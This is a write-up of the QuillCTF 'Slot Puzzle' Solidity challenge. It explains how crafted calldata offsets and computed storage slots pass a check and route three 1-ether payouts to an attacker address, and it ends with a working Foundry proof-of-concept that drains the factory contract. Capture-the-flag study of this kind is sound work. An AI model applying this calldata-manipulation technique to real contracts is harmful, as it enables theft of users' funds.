---
title: QuillCTF - Slot Puzzle
description: 2023 | Hard | Solidity Security
tags:
    - smart contract
    - storage layout
---

## Objective of CTF

> Your purpose is just to call the deploy() function to recover the 3 ether.

[QuillCTF Challenges - Slot Puzzle](https://quillctf.super.site/challenges/quillctf-challenges/slot-puzzle)

## Vulnerability Description

- Only the instance of SlotPuzzle deployed from SlotPuzzleFactory can call the `payout()` function to transfer ether and we need to pass the check in `ascertainSlot()` to let SlotPuzzle call `payout()`
- Calculate the slot iteratively according to `keccak256(key, slot + (is ghostStore ? 1 : 0))` pattern
- We need three recipients, all pointing to hacker, to recover 3 ether since each `payout()` can only transfer 1 ether
- The difficult part is to decide `offset` > <
    - `params.slotKey` is copy from calldata to memory. `bytes memory slotKey` stores the slotKey offset in memory, here is 0x80
    - The offset of slot is calculated using `add(slotKey, calldataload(offset))`. So, the value of `offset` should be the offset of target value (i.e. slot.offset - slotKey) in the calldata. We can make use of `Parameters.slotKey` to pass that value

    Offset(Hex)|Calldata Layout
    -|-
    04|offset of struct Parameters
    24|totalRecipients, 3
    44|offset
    64|offset of the Recipients array (relative to struct offset)
    84|offset of slotKey (relative to struct offset)
    a4|size of the Recipients array
    c4|recipients[0].account
    ...|...
    184|size of slotKey
    1a4|slot.offset - 0x80
    1c4|slot

## Proof of Concept

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import { SlotPuzzle } from "src/SlotPuzzle.sol";
import { SlotPuzzleFactory } from "src/SlotPuzzleFactory.sol";
import { Parameters, Recipients } from "src/interface/ISlotPuzzleFactory.sol";

contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;
    SlotPuzzleFactory public slotPuzzleFactory;
    address hacker;

    function setUp() public {
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        hacker = makeAddr("hacker");
    }

    function calc(uint256[8] memory keys, uint256 slot) internal pure returns (uint256) {
        for (uint8 i = 0; i < 8; i ++) {
            slot = uint256(keccak256(abi.encodePacked(keys[i], slot)));
            if (i % 2 == 1) slot += 1; // move to variable map
        }
        return slot - 1; // back to variable hash
    }

    function testHack() public {
        vm.startPrank(hacker, hacker);
        assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

        // solution
        Recipients[] memory recipients = new Recipients[](3);
        recipients[0] = Recipients({
            account: hacker,
            amount: 1 ether
        });
        recipients[1] = recipients[0];
        recipients[2] = recipients[0];

        bytes32 slot = keccak256(
            abi.encodePacked(calc(
                [
                    uint256(uint160(hacker)), block.number,
                    block.timestamp, uint256(uint160(address(slotPuzzleFactory))),
                    block.prevrandao, uint256(uint160(address(block.coinbase))),
                    block.chainid, uint256(uint160(uint256(blockhash(block.number - block.basefee))))
                ],
                1
            ))
        );

        slotPuzzleFactory.deploy(
            Parameters({
                totalRecipients: 3,
                offset: 0x1a4,  // offset to the value 0x144
                recipients: recipients,
                slotKey: abi.encode(0x144, slot)
                // 0x144 = slot.offset(0x1c4) - 0x80
            })
        );

        assertEq(address(slotPuzzleFactory).balance, 0, "weth contract should have 0 ether");
        assertEq(address(hacker).balance, 3 ether, "hacker should have 3 ether");

        vm.stopPrank();
    }
}
```